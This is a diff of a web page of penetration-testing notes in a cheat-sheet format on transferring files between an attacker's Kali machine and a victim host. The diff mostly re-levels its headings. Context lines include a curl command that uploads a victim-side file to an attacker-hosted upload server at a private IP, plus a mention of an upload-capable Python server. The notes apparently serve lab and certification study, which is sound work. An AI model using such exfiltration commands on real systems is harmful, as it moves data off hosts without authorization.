@@ -173,15 +173,15 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h2 id="links"><a class="header" href="#links">Links</a></h2>
+                        <h2 id="file-transfer"><a class="header" href="#file-transfer">File Transfer</a></h2>
+<h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="https://juggernaut-sec.com/windows-file-transfers-for-hackers/">Windows File Transfer</a></li>
-<li></li>
 </ul>
-<h2 id="introduction"><a class="header" href="#introduction"><strong>Introduction</strong></a></h2>
+<h3 id="introduction"><a class="header" href="#introduction"><strong>Introduction</strong></a></h3>
 <p>When performing enumeration steps during a penetration test, there is often the need to transfer files to or from the victim machine, for example to run custom scripts or analyze files further in a controlled environment.</p>
 <p>There are different techniques and tools that can be used to transfer files and depending on the target operating system and installed software these may or may not work. The purpose of this cheat sheet is to provide an exhaustive resource for transferring files using command-line interfaces.</p>
-<h2 id="hosting-files"><a class="header" href="#hosting-files"><strong>Hosting Files</strong></a></h2>
+<h3 id="hosting-files"><a class="header" href="#hosting-files"><strong>Hosting Files</strong></a></h3>
 <p>Files can be hosted using methods such as web servers, FTP, SMB etc. The cheat sheet below provides with some of the most common techniques that can be used to host files:</p>
 <div class="table-wrapper"><table><thead><tr><th></th><th></th></tr></thead><tbody>
 <tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr>
@@ -202,7 +202,7 @@
 <tr><td>base64 file;</td><td>Encoding the the file using base 64 and decoding it in the target machine</td></tr>
 </tbody></table>
 </div>
-<h2 id="downloading-files"><a class="header" href="#downloading-files"><strong>Downloading Files</strong></a></h2>
+<h3 id="downloading-files"><a class="header" href="#downloading-files"><strong>Downloading Files</strong></a></h3>
 <p>Files can be downloaded through the use of various tools such as wget/curl FTP, SMB etc. The cheat sheet below provides with some of the most common techniques that can be used to host files:</p>
 <div class="table-wrapper"><table><thead><tr><th></th><th></th></tr></thead><tbody>
 <tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr>
@@ -226,7 +226,7 @@
 <tr><td>echo -n “base64-output” &gt; file</td><td>Decoding the base64 output of the file</td></tr>
 </tbody></table>
 </div>
-<h2 id="uploading-file-back-to-kali"><a class="header" href="#uploading-file-back-to-kali">Uploading file back to Kali</a></h2>
+<h3 id="uploading-file-back-to-kali"><a class="header" href="#uploading-file-back-to-kali">Uploading file back to Kali</a></h3>
 <pre><code>When using the python upload script:
 
 On Attacker: python3 SimpleHTTPServerWithUpload.py
@@ -243,7 +243,7 @@ OR
 
 curl -v -XPOST -F "file=@/home/anita/arat/test1;filename=test1" -F "path=/home/kali/Desktop/pen200/relia" http://192.168.45.219:9090/upload
 </code></pre>
-<h2 id="simplehttpserverwithuploadpy"><a class="header" href="#simplehttpserverwithuploadpy">SimpleHTTPServerWithUpload.py</a></h2>
+<h3 id="simplehttpserverwithuploadpy"><a class="header" href="#simplehttpserverwithuploadpy">SimpleHTTPServerWithUpload.py</a></h3>
 <pre><code>***SimpleHTTPServerWithUpload.py
 
 #!/usr/bin/env python3
